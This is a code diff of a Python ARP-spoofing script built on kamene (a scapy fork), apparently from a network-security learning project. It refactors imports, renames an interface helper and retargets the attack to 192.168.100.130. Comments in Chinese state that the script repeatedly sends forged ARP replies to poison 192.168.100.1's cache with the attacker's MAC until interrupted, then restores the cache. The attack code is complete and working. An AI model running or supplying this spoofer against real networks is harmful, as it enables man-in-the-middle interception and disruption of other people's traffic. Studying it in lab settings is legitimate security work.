@@ -2,10 +2,10 @@ import logging
 
 logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
 from kamene.all import *
-from get_ip_netifaces_exe import get_ip_address  # 导入获取本机IP地址方法
-from ..get_mac_netifaces_exe import get_mac_address
-from arp_request_exe import arp_request  # 导入之前创建的ARP请求脚本
-# from ..get_ifname import get_ifname  # 获取scapy iface的名字
+from Protocol.Tools.get_ip_netifaces_exe import get_ip_address  # 导入获取本机IP地址方法
+from Protocol.Tools.get_mac_netifaces_exe import get_mac_address
+from Protocol.Tools.arp_request_exe import arp_request  # 导入之前创建的ARP请求脚本
+from get_ifname import get_ifname  # 获取scapy iface的名字
 import time
 import signal
 
@@ -29,7 +29,7 @@ def arp_spoof(ip_1, ip_2, ifname='ens33'):
     while True:  # 一直攻击，直到ctl+c出现！！！
         # op=2,响应ARP
         sendp(Ether(src=localmac, dst=ip_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
-              iface=scapy_iface(g_ifname),
+              iface=get_ifname(g_ifname),
               verbose=False)
         # op=1,请求ARP
         # sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
@@ -47,7 +47,7 @@ def sigint_handler(signum, frame):  # 定义处理方法
     print("\n执行恢复操作！！！")
     # 发送ARP数据包，恢复被毒化设备的ARP缓存
     sendp(Ether(src=ip_2_mac, dst=ip_1_mac) / ARP(op=2, hwsrc=ip_2_mac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
-          iface=scapy_iface(g_ifname),
+          iface=get_ifname(g_ifname),
           verbose=False)
     print("已经恢复 " + g_ip_1 + " ARP缓存")
     # 退出程序，跳出while True
@@ -56,5 +56,5 @@ def sigint_handler(signum, frame):  # 定义处理方法
 
 if __name__ == "__main__":
     # Windows Linux均可使用
-    # 欺骗192.168.100.1 让它认为192.168.100.150的MAC地址为本地攻击者计算机的MAC
-    arp_spoof('192.168.100.1', '192.168.100.150', 'ens33')
+    # 欺骗192.168.100.1 让它认为192.168.100.130的MAC地址为本地攻击者计算机的MAC
+    arp_spoof('192.168.100.1', '192.168.100.130', 'ens33')
